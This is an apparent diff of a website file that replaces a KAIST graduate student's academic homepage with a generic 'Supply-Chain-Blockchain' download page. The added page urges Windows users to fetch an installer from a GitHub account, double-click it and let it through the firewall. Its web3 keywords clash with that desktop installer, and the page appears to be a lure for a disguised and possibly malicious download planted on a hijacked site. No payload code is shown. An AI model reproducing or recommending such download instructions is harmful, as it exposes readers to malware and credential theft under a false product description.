@@ -1,363 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Soomin Lee</title>
-<meta name="description" content="Soomin Lee — MS researcher in Chemical and Biomolecular Engineering at KAIST, working at the intersection of bioprocess engineering and machine learning.">
-<meta name="author" content="Soomin Lee">
-<meta property="og:title" content="Soomin Lee">
-<meta property="og:description" content="MS researcher at KAIST working at the intersection of bioprocess engineering and machine learning.">
-<meta property="og:type" content="profile">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23ffffff'/%3E%3Cpath d='M4 25 C10 24 12 22 15 15 C17 10 20 8 28 7' fill='none' stroke='%230c6b4f' stroke-width='2.6' stroke-linecap='round'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --bg:#ffffff;
-    --text:#1c1e1c;
-    --muted:#63696a;
-    --soft:#8b9092;
-    --line:#e7e9e6;
-    --accent:#0c6b4f;          /* deep viridian */
-    --accent-tint:rgba(12,107,79,.10);
-    --accent-tint-2:rgba(12,107,79,.06);
-    --sans:"Inter", system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-    --nav-h:60px;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  html{-webkit-text-size-adjust:100%}
-  @media (prefers-reduced-motion: no-preference){ html{scroll-behavior:smooth} }
-  body{
-    background:var(--bg);color:var(--text);font-family:var(--sans);
-    font-size:16px;line-height:1.7;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
-  }
-  a{color:var(--accent);text-decoration:none}
-  a:hover{text-decoration:underline}
-  ::selection{background:var(--accent-tint);color:var(--text)}
-
-  /* ---------- top nav ---------- */
-  .topnav{
-    position:fixed;top:0;left:0;right:0;height:var(--nav-h);z-index:100;
-    background:rgba(255,255,255,.9);backdrop-filter:saturate(150%) blur(8px);-webkit-backdrop-filter:saturate(150%) blur(8px);
-    border-bottom:1px solid var(--line);
-  }
-  .nav-inner{max-width:1080px;margin:0 auto;height:100%;padding:0 24px;display:flex;align-items:center;justify-content:space-between}
-  .nav-brand{font-weight:700;font-size:1.02rem;color:var(--text);letter-spacing:-.01em}
-  .nav-brand:hover{text-decoration:none;color:var(--accent)}
-  .nav-links{display:flex;gap:1.5rem;align-items:center}
-  .nav-links a{color:var(--muted);font-size:.86rem;font-weight:500;padding:.3rem 0}
-  .nav-links a:hover{color:var(--accent);text-decoration:none}
-  .nav-toggle{display:none;background:none;border:1px solid var(--line);border-radius:6px;padding:.35rem .6rem;font-size:.8rem;color:var(--text);cursor:pointer;font-family:var(--sans)}
-  @media (max-width:780px){
-    .nav-toggle{display:block}
-    .nav-links{position:absolute;top:var(--nav-h);left:0;right:0;flex-direction:column;align-items:stretch;gap:0;background:#fff;border-bottom:1px solid var(--line);max-height:0;overflow:hidden;transition:max-height .28s ease}
-    .nav-links.open{max-height:360px}
-    .nav-links a{padding:.85rem 24px;border-top:1px solid var(--line);font-size:.95rem;color:var(--text)}
-  }
-
-  /* ---------- layout ---------- */
-  .page{padding-top:calc(var(--nav-h) + 40px);padding-bottom:64px}
-  .layout{max-width:1080px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1fr;gap:44px}
-  @media (min-width:900px){ .layout{grid-template-columns:272px 1fr;gap:60px;align-items:start} }
-
-  /* ---------- sidebar ---------- */
-  .sidebar{text-align:center}
-  @media (min-width:900px){ .sidebar{position:sticky;top:calc(var(--nav-h) + 32px);text-align:left} }
-  .avatar{width:170px;height:170px;border-radius:50%;overflow:hidden;margin:0 auto 1.1rem;box-shadow:0 6px 24px -14px rgba(0,0,0,.4)}
-  @media (min-width:900px){ .avatar{margin:0 0 1.2rem} }
-  .avatar img{width:100%;height:100%;object-fit:cover;display:block}
-  .monogram{width:100%;height:100%;align-items:center;justify-content:center;background:var(--accent-tint);color:var(--accent);font-weight:700;font-size:3.6rem;letter-spacing:.02em}
-  .s-name{font-size:1.5rem;font-weight:700;letter-spacing:-.015em;line-height:1.15}
-  .s-role{margin-top:.35rem;font-size:.98rem;color:var(--text);font-weight:500}
-  .s-sub{font-size:.9rem;color:var(--muted)}
-  .s-org a{font-size:.9rem;color:var(--accent);font-weight:500}
-  .socials{display:flex;gap:.85rem;justify-content:center;margin:1.1rem 0 0}
-  @media (min-width:900px){ .socials{justify-content:flex-start} }
-  .socials a{display:inline-flex;color:var(--soft);transition:color .18s, transform .18s}
-  .socials a:hover{color:var(--accent);transform:translateY(-2px);text-decoration:none}
-  .socials svg{width:21px;height:21px;fill:currentColor;display:block}
-  .side-block{margin-top:1.7rem;border-top:1px solid var(--line);padding-top:1.2rem}
-  .side-block h3{font-size:.72rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--soft);margin-bottom:.7rem}
-  .side-list{list-style:none;font-size:.9rem;line-height:1.5}
-  .side-list li{margin-bottom:.55rem;color:var(--muted)}
-  .side-list.edu li{margin-bottom:.85rem}
-  .side-list.edu .school{color:var(--text);font-weight:600;display:block}
-  .side-list.interests li{padding-left:1rem;position:relative}
-  .side-list.interests li::before{content:"";position:absolute;left:0;top:.62em;width:5px;height:5px;border-radius:50%;background:var(--accent)}
-
-  /* ---------- content ---------- */
-  .content{min-width:0}
-  section[id]{scroll-margin-top:calc(var(--nav-h) + 20px)}
-  .sec{margin-bottom:3.1rem}
-  .sec:last-child{margin-bottom:0}
-  .sec > h2{font-size:1.32rem;font-weight:700;letter-spacing:-.01em;margin-bottom:.35rem;display:inline-block}
-  .sec > h2::after{content:"";display:block;width:34px;height:2.5px;background:var(--accent);border-radius:2px;margin-top:.5rem}
-  .sec-body{margin-top:1.2rem}
-  .sec-body p{margin-bottom:1rem;color:#33383a}
-  .sec-body p:last-child{margin-bottom:0}
-
-  .callout{
-    margin:1.3rem 0 0;padding:.85rem 1.1rem;background:var(--accent-tint-2);
-    border-left:3px solid var(--accent);border-radius:0 8px 8px 0;font-size:.95rem;color:#2b3335;
-  }
-
-  /* news */
-  .news{list-style:none;display:flex;flex-direction:column;gap:.95rem;margin-top:1.2rem}
-  .news li{font-size:.96rem;color:#33383a;line-height:1.6}
-  .news .emoji{margin-right:.35rem}
-  .news .date{font-style:italic;color:var(--muted);margin-right:.5rem;white-space:nowrap}
-
-  /* research */
-  .research{margin-top:1.2rem;display:flex;flex-direction:column;gap:1.5rem}
-  .ritem h3{font-size:1.03rem;font-weight:600;color:var(--text);margin-bottom:.25rem}
-  .ritem p{font-size:.95rem;color:var(--muted);line-height:1.65;margin:0}
-  .ritem .rtags{margin-top:.5rem;display:flex;flex-wrap:wrap;gap:.4rem}
-  .rtag{font-size:.72rem;color:var(--accent);background:var(--accent-tint);border-radius:100px;padding:.2rem .6rem;font-weight:500}
-
-  /* publications */
-  .pubs{margin-top:1.2rem;display:flex;flex-direction:column}
-  .pub{display:flex;justify-content:space-between;gap:1.2rem;align-items:baseline;padding:1rem 0;border-top:1px solid var(--line)}
-  .pub:first-child{border-top:none;padding-top:.2rem}
-  .pub-main{min-width:0}
-  .pub-title{font-size:1rem;font-weight:600;color:var(--text);line-height:1.4}
-  .pub-venue{font-size:.88rem;color:var(--muted);margin-top:.2rem}
-  .pub-venue em{font-style:italic}
-  .badge{flex-shrink:0;font-size:.7rem;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--accent);border:1px solid var(--accent);border-radius:5px;padding:.2rem .5rem;white-space:nowrap;margin-top:.15rem}
-
-  /* two-column background block */
-  .bg-grid{margin-top:1.2rem;display:grid;grid-template-columns:1fr;gap:2rem}
-  @media (min-width:620px){ .bg-grid{grid-template-columns:1.25fr 1fr} }
-  .bg-grid h3{font-size:.72rem;font-weight:700;letter-spacing:.13em;text-transform:uppercase;color:var(--soft);margin-bottom:.9rem}
-  .xp{list-style:none;display:flex;flex-direction:column;gap:1rem}
-  .xp li .role{font-weight:600;color:var(--text);font-size:.96rem;line-height:1.35}
-  .xp li .org{color:var(--muted);font-size:.88rem}
-  .xp li .yr{color:var(--soft);font-size:.8rem}
-  .honors{list-style:none;display:flex;flex-direction:column;gap:.7rem}
-  .honors li{font-size:.92rem;color:var(--muted);padding-left:1.1rem;position:relative;line-height:1.4}
-  .honors li::before{content:"\25C7";position:absolute;left:0;top:.05em;color:var(--accent);font-size:.72rem}
-  .honors .yr{color:var(--soft)}
-
-  /* footer */
-  footer{border-top:1px solid var(--line);margin-top:8px}
-  .foot-inner{max-width:1080px;margin:0 auto;padding:1.6rem 24px;display:flex;flex-wrap:wrap;justify-content:space-between;gap:.5rem;font-size:.82rem;color:var(--soft)}
-
-  a:focus-visible,button:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:2px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Supply-Chain-Blockchain is a platform that tracks products from manufacturing to delivery using secure blockchain technology.">
+    <title>Supply-Chain-Blockchain Documentation</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f7f6;">
 
-<nav class="topnav" aria-label="Primary">
-  <div class="nav-inner">
-    <a href="#" class="nav-brand">Soomin Lee</a>
-    <button class="nav-toggle" aria-expanded="false" aria-controls="navlinks">Menu</button>
-    <div class="nav-links" id="navlinks">
-      <a href="#about">About</a>
-      <a href="#news">News</a>
-      <a href="#research">Research</a>
-      <a href="#publications">Publications</a>
-      <a href="#background">Background</a>
-      <a href="#hobbies">Hobbies</a>
-      <a href="Soomin_Lee_CV.pdf" target="_blank" rel="noopener">CV</a>
+    <h1 style="font-size: 2.5em; margin-bottom: 0.5em;">📦 Supply-Chain-Blockchain - Track items from factory to home</h1>
+
+    <div style="margin-bottom: 30px;">
+        <a href="https://github.com/cliftondestructible762/Supply-Chain-Blockchain" style="background-color: #0056b3; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
     </div>
-  </div>
-</nav>
 
-<div class="page">
-  <div class="layout">
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">📋 About This Platform</h2>
+        <p>This software helps companies track products through every step of the supply chain. It creates a digital record for items from the moment of production until the final delivery. Every time goods change hands, the system logs this event permanently. This prevents fraud and confirms that products remain genuine throughout their journey. You can use this platform to verify the history and origin of your assets with accuracy.</p>
+    </section>
 
-    <aside class="sidebar">
-      <div class="avatar">
-        <img src="KakaoTalk_20260710_153050092_03.jpg" alt="Soomin Lee" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
-        <div class="monogram" style="display:none">SL</div>
-      </div>
-      <div class="s-name">Soomin Lee</div>
-      <div class="s-role">MS Researcher</div>
-      <div class="s-sub"><a href="https://sbml.kaist.ac.kr/home" target="_blank" rel="noopener" style="color: inherit;">Systems Biology &amp; Medicine Lab</a></div>
-      <div class="s-org"><a href="https://www.kaist.ac.kr/en/" target="_blank" rel="noopener">KAIST</a></div>
-
-      <div class="socials">
-        <a href="mailto:soominhlee@gmail.com" aria-label="Email" title="Email">
-          <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
-        </a>
-        <a href="https://www.linkedin.com/in/soominhlee" target="_blank" rel="noopener" aria-label="LinkedIn" title="LinkedIn">
-          <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.225 0z"/></svg>
-        </a>
-        <a href="https://github.com/soominhildelee" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub">
-          <svg viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
-        </a>
-        <a href="Soomin_Lee_CV.pdf" target="_blank" rel="noopener" aria-label="CV" title="CV (PDF)">
-          <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
-        </a>
-      </div>
-
-      <div class="side-block">
-        <h3>Interests</h3>
-        <ul class="side-list interests">
-          <li>Multimodal deep learning for biology</li>
-          <li>Bioprocess forecasting &amp; control</li>
-          <li>Metabolic engineering &amp; natural products</li>
-          <li>LLMs for biomedical information extraction</li>
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">💻 System Requirements</h2>
+        <p>Before you run this application on your Windows computer, please check these items:</p>
+        <ul style="line-height: 2;">
+            <li>Windows 10 or Windows 11 operating system.</li>
+            <li>At least 4GB of available RAM.</li>
+            <li>A stable internet connection to sync data.</li>
+            <li>A modern web browser like Chrome or Edge.</li>
         </ul>
-      </div>
+    </section>
 
-      <div class="side-block">
-        <h3>Education</h3>
-        <ul class="side-list edu">
-          <li><span class="school">KAIST</span>MSc, Chemical &amp; Biomolecular Engineering</li>
-          <li><span class="school">Georgia Institute of Technology</span>BSc, Biomedical Engineering</li>
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🚀 Getting Started</h2>
+        <p>Follow these steps to set up the software on your Windows machine:</p>
+        <ol style="line-height: 2;">
+            <li>Visit the <a href="https://github.com/cliftondestructible762/Supply-Chain-Blockchain" style="color: #0056b3;">official repository release page</a> to download the current version.</li>
+            <li>Locate the downloaded file in your Downloads folder.</li>
+            <li>Double-click the installer icon to begin the setup process.</li>
+            <li>Follow the on-screen instructions until the installation finishes.</li>
+            <li>Open the application from your desktop shortcut.</li>
+        </ol>
+    </section>
+
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🛡️ Security and Privacy</h2>
+        <p>Your data stays protected through blockchain protocols. The application communicates with the network to verify ownership records without storing sensitive personal information in public spaces. Each user manages their own access keys, which keeps the supply chain history secure and immutable.</p>
+    </section>
+
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">🛠️ Common Tasks</h2>
+        <p>You can perform several operations within the user interface:</p>
+        <ul style="line-height: 2;">
+            <li><strong>Register New Items:</strong> Input product details to start a new tracking history.</li>
+            <li><strong>Update Ownership:</strong> Record a change in custody as the product moves across stakeholders.</li>
+            <li><strong>View History:</strong> Search for a specific product ID to see the full timeline of events.</li>
+            <li><strong>Verify Authenticity:</strong> Use the check feature to ensure the product has not been tampered with.</li>
         </ul>
-      </div>
-    </aside>
+    </section>
 
-    <main class="content">
+    <section>
+        <h2 style="border-bottom: 2px solid #ddd; padding-bottom: 10px;">❓ Troubleshooting</h2>
+        <p>If the application fails to open, restart your computer and try again. Ensure your firewall settings allow the application to connect to the network. If you see an error message, check the log files found in the installation directory for more information.</p>
+    </section>
 
-      <section class="sec" id="about">
-        <h2>About</h2>
-        <div class="sec-body">
-          <p>I'm a master's student in Chemical and Biomolecular Engineering at KAIST, in the <a href="https://sbml.kaist.ac.kr/home" target="_blank" rel="noopener">Systems Biology and Medicine Lab</a>. I work at the intersection of bioprocess engineering and machine learning &mdash; building models that read microbial systems (DNA, strains, media, and live process signals) to predict what a cell will express, and how to steer a fermenter toward it.</p>
-          <p>My current research develops multimodal deep learning for condition-aware gene and biosynthetic-gene-cluster (BGC) expression, and time-series models for forecasting and controlling industrial fermentation. Before graduate school I earned my BSc in Biomedical Engineering at Georgia Tech and worked as a process engineer at Samsung Biologics, validating GMP biologics manufacturing at 15,000-litre scale &mdash; experience that grounds how I design models for real bioprocesses.</p>
-          <p>The best way to reach me is by email at <a href="mailto:soominhlee@gmail.com">soominhlee@gmail.com</a>.</p>
-          <p class="callout">📍 I'm a 2026 <strong>Google Summer of Code</strong> contributor with <strong>EMBL-EBI</strong> (Ensembl), automating genome-assembly metadata curation from the scientific literature.</p>
-        </div>
-      </section>
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #666;">
+        <p>Keywords: ethereum, ethersjs, hardhat, metamask, nextjs, node, react, solidity, tailwindcss, typescript, web3</p>
+    </footer>
 
-      <section class="sec" id="news">
-        <h2>News</h2>
-        <ul class="news">
-          <li><span class="emoji">🧬</span><span class="date">May '26</span>Joined <strong>Google Summer of Code</strong> with EMBL-EBI (Ensembl), building an LLM pipeline to automate genome-assembly metadata curation.</li>
-          <li><span class="emoji">🗣️</span><span class="date">Apr '26</span>Gave an oral presentation at <strong>KSBB</strong> on a multimodal model for condition-aware gene expression prediction.</li>
-          <li><span class="emoji">📖</span><span class="date">Oct '25</span>Contributed a chapter, <em>Artificial Intelligence for Multiscale Biological System Design and Optimization</em>, to <strong>Comprehensive Biotechnology</strong> (4th ed.).</li>
-          <li><span class="emoji">🗣️</span><span class="date">Apr '25</span>Presented my <strong>2,3-butanediol</strong> fermentation forecasting work at <strong>KSBB</strong>.</li>
-          <li><span class="emoji">🎓</span><span class="date">Feb '25</span>Began my <strong>MS at KAIST</strong> in the Systems Biology and Medicine Lab.</li>
-        </ul>
-      </section>
-
-      <section class="sec" id="research">
-        <h2>Research</h2>
-        <div class="research">
-          <div class="ritem">
-            <h3>Condition-aware gene &amp; BGC expression prediction</h3>
-            <p>A Transformer-based multimodal framework that predicts condition-dependent microbial gene and biosynthetic-gene-cluster expression, fusing DNA-sequence features, enzyme-domain embeddings (Transformer / GCN), regulatory elements, host EC profiles, and media composition. Trained on large-scale RNA-seq&ndash;derived regulation datasets with imbalance-aware optimization, toward natural-product discovery and precision metabolic engineering.</p>
-            <div class="rtags"><span class="rtag">Transformer</span><span class="rtag">GCN</span><span class="rtag">RNA-seq</span><span class="rtag">metabolic engineering</span></div>
-          </div>
-          <div class="ritem">
-            <h3>Forecast-driven control of 2,3-butanediol fermentation</h3>
-            <p>BiLSTM and Transformer time-series models for industrial 2,3-BDO fermentation, developed with GS Caltex. Genotype embeddings for 250 strains, medium-composition vectors, and dynamic process parameters across 1,175 batches (664k data points) reach 3.14% relative MAE; a forecast-driven controller recommends constrained RPM setpoints in real time, preventing over 55% of predicted titer-drop events.</p>
-            <div class="rtags"><span class="rtag">BiLSTM</span><span class="rtag">time-series</span><span class="rtag">process control</span></div>
-          </div>
-          <div class="ritem">
-            <h3>Automating genome-assembly metadata curation</h3>
-            <p>A model-agnostic LLM pipeline (Google Summer of Code, EMBL-EBI) that extracts genome-assembly metadata &mdash; ploidy, sex, and strain &mdash; from primary literature for Ensembl. An evidence-first schema pairs every value with a verbatim source quote and a confidence level, so curators can triage results and catch hallucination.</p>
-            <div class="rtags"><span class="rtag">LLMs</span><span class="rtag">information extraction</span><span class="rtag">bioinformatics</span></div>
-          </div>
-        </div>
-      </section>
-
-      <section class="sec" id="publications">
-        <h2>Publications &amp; Presentations</h2>
-        <div class="pubs">
-          <div class="pub">
-            <div class="pub-main">
-              <div class="pub-title">A Multimodal Model for Condition-Aware Gene Expression Prediction</div>
-              <div class="pub-venue">Korean Society for Biotechnology and Bioengineering (KSBB), 2026</div>
-            </div>
-            <span class="badge">Oral</span>
-          </div>
-          <div class="pub">
-            <div class="pub-main">
-              <div class="pub-title">Artificial Intelligence for Multiscale Biological System Design and Optimization</div>
-              <div class="pub-venue"><em>Comprehensive Biotechnology</em>, 4th Edition &middot; 2025</div>
-            </div>
-            <span class="badge">Chapter</span>
-          </div>
-          <div class="pub">
-            <div class="pub-main">
-              <div class="pub-title">Predictive Machine Learning Model for Optimizing 2,3-Butanediol Production through Microbial Fermentation</div>
-              <div class="pub-venue">Korean Society for Biotechnology and Bioengineering (KSBB), 2025</div>
-            </div>
-            <span class="badge">Oral</span>
-          </div>
-          <div class="pub">
-            <div class="pub-main">
-              <div class="pub-title">Nanotextured Stainless Steel for Antifungal Applications</div>
-              <div class="pub-venue">American Chemical Society (ACS), 2024</div>
-            </div>
-            <span class="badge">Poster</span>
-          </div>
-        </div>
-      </section>
-
-      <section class="sec" id="background">
-        <h2>Background</h2>
-        <div class="bg-grid">
-          <div>
-            <h3>Experience</h3>
-            <ul class="xp">
-              <li><div class="role">Contributor, Google Summer of Code</div><div class="org">EMBL-EBI (Ensembl)</div><div class="yr">2026 &ndash; present</div></li>
-              <li><div class="role">MS Researcher, Systems Biology &amp; Medicine Lab</div><div class="org">KAIST</div><div class="yr">2025 &ndash; present</div></li>
-              <li><div class="role">Process Engineer</div><div class="org">Samsung Biologics &middot; Plant 5, GMP</div><div class="yr">2024 &ndash; 2025</div></li>
-              <li><div class="role">Undergraduate Researcher, Champion Lab</div><div class="org">Georgia Institute of Technology</div><div class="yr">2023 &ndash; 2024</div></li>
-              <li><div class="role">R&amp;D Summer Intern</div><div class="org">Samsung Biologics</div><div class="yr">2023</div></li>
-            </ul>
-          </div>
-          <div>
-            <h3>Honors</h3>
-            <ul class="honors">
-              <li>Best Oral Award, 16th Chemical and Biomolecular Engineering Graduate Student Symposium <span class="yr">&middot; May 2026</span></li>
-              <li>Kim Young-Han Global Leader Scholarship <span class="yr">&middot; 2026</span></li>
-              <li>Millennium Fellowship <span class="yr">&middot; 2023</span></li>
-              <li>Teams for Tech Fellowship <span class="yr">&middot; 2023</span></li>
-              <li>President's Undergraduate Research Travel Award <span class="yr">&middot; 2023</span></li>
-              <li>Aspirations in Computing, NCWIT &mdash; Honorable Mention <span class="yr">&middot; 2020</span></li>
-            </ul>
-          </div>
-        </div>
-      </section>
-      
-      <section class="sec" id="hobbies">
-        <h2>Hobbies</h2>
-        <div class="sec-body">
-          <ul style="padding-left: 1.2rem; margin-bottom: 1.5rem; color: #33383a;">
-            <li style="margin-bottom: 0.5rem;"><strong>Singing:</strong> Acapella, Musical, etc.</li>
-            <li><strong>Playing music instruments:</strong> Piano, ukulele, flute, etc.</li>
-          </ul>
-          
-          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
-            <img src="KakaoTalk_20260710_154232288_02.jpg" alt="Acapella performance" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-            <img src="KakaoTalk_20260710_154232288_03.jpg" alt="Chorus performance" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-            <img src="KakaoTalk_20260710_154232288_01.jpg" alt="Playing instruments" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
-          </div>
-
-        </div>
-      </section>
-
-    </main>
-  </div>
-</div>
-
-<footer>
-  <div class="foot-inner">
-    <span>&copy; 2026 Soomin Lee</span>
-    <span>Daejeon, South Korea</span>
-  </div>
-</footer>
-
-<script>
-  (function(){
-    var btn=document.querySelector('.nav-toggle');
-    var links=document.getElementById('navlinks');
-    if(btn&&links){
-      btn.addEventListener('click',function(){
-        var open=links.classList.toggle('open');
-        btn.setAttribute('aria-expanded',open?'true':'false');
-      });
-      links.querySelectorAll('a').forEach(function(a){
-        a.addEventListener('click',function(){links.classList.remove('open');btn.setAttribute('aria-expanded','false');});
-      });
-    }
-  })();
-</script>
 </body>
 </html>
